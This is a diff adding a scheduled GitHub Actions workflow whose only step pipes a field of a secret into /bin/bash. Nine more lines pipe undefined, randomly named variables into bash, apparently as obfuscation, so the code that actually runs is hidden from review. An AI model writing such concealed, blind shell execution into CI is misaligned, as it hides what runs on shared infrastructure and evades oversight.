@@ -1,0 +1,27 @@
+name: zongyifanjian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zongyifanjian
+        env:
+          p8: ${{ secrets.p8 }}
+        run: |
+          echo $p8 | jq -r .b24495 | /bin/bash
+          echo $l7 | jq -r .wroah39377 | /bin/bash
+          echo $e46684 | jq -r .issx39 | /bin/bash
+          echo $l43881 | jq -r .o5 | /bin/bash
+          echo $x19757 | jq -r .panwh3530 | /bin/bash
+          echo $tdqu09319 | jq -r .qmhn01540 | /bin/bash
+          echo $amwu50180 | jq -r .a4 | /bin/bash
+          echo $tsapt7 | jq -r .vei3 | /bin/bash
+          echo $ezvj91721 | jq -r .bxhy58047 | /bin/bash
+          echo $cya853 | jq -r .wstcc23145 | /bin/bash
+
